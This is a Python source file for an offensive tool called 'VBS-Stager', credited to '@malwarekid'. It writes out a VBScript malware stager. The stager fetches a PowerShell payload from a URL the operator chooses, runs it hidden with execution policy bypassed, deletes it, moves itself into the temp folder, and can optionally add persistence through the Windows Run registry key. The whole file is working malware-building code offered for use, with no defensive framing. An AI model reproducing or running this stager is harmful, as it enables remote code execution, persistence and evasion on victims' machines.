import os
import pyfiglet
from colorama import init, Fore, Style

init()

def print_banner():
    ascii_art = '''
 _    ______ _____      _____ __                       
| |  / / __ ) ___/     / ___// /_____ _____ ____  _____
| | / / __  \__ \______\__ \/ __/ __ `/ __ `/ _ \/ ___/
| |/ / /_/ /__/ /_____/__/ / /_/ /_/ / /_/ /  __/ /    
|___/_____/____/     /____/\__/\__,_/\__, /\___/_/     
                                    /____/             
                                        By @malwarekid
'''
    colored_ascii_art = Fore.GREEN + ascii_art + Style.RESET_ALL
    print(colored_ascii_art)

def generate_vbs_stager(url, output_file, persistence):
    persistence_command = f'''
strKeyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
strKeyName = "Stager"
strValue = "wscript.exe """ & objShell.ExpandEnvironmentStrings("%TEMP%") & "\\{output_file}"
If Not RegKeyExists(strKeyPath, strKeyName) Then
    objShell.RegWrite strKeyPath & "\\" & strKeyName, strValue
End If
'''
    stager_script = f'''
Dim objShell, objFSO, url, strKeyPath, strKeyName, strValue
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
{persistence_command if persistence.lower() == 'yes' else ''}
Function RegKeyExists(keyPath, keyName)
    On Error Resume Next
    RegKeyExists = Not objShell.RegRead(keyPath & "\\" & keyName) = ""
    On Error GoTo 0
End Function
Function ExecutePowerShellScript(url)
    Dim oStream, scriptContent, tempScriptPath
    Set oStream = CreateObject("WinHttp.WinHttpRequest.5.1")
    oStream.Open "GET", url, False
    oStream.Send
    If oStream.Status = 200 Then
        scriptContent = oStream.ResponseBody
        tempScriptPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\\temp.ps1"
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write scriptContent
        oStream.SaveToFile tempScriptPath, 2
        oStream.Close
        objShell.Run "powershell.exe -ExecutionPolicy Bypass -File " & tempScriptPath, 0, True
        objFSO.DeleteFile tempScriptPath
    End If
End Function
url = "{url}"
ExecutePowerShellScript url
Sub MoveScriptToTemp
    Dim tempDir, scriptPath, destination
    tempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
    scriptPath = WScript.ScriptFullName
    destination = tempDir & "\\stager.vbs"
    If Not objFSO.FileExists(destination) Then
        objFSO.MoveFile scriptPath, destination
    End If
End Sub
MoveScriptToTemp
'''

    with open(output_file, 'w') as f:
        f.write(stager_script)

def main():
    print_banner()
    url = input(Fore.YELLOW + "Enter the URL of the PowerShell script: " + Style.RESET_ALL)
    
    output_file = input(Fore.YELLOW + "Enter the output file name (default: stager.vbs): " + Style.RESET_ALL)
    if not output_file:
        output_file = "stager.vbs"
    
    persistence = input(Fore.RED + "Do you want to add persistence to the stager? (yes/no, default: no): " + Style.RESET_ALL)
    persistence = persistence.strip().lower() if persistence else 'no'

    generate_vbs_stager(url, output_file, persistence)
    print(Fore.GREEN + f"Stager script saved to {output_file}" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
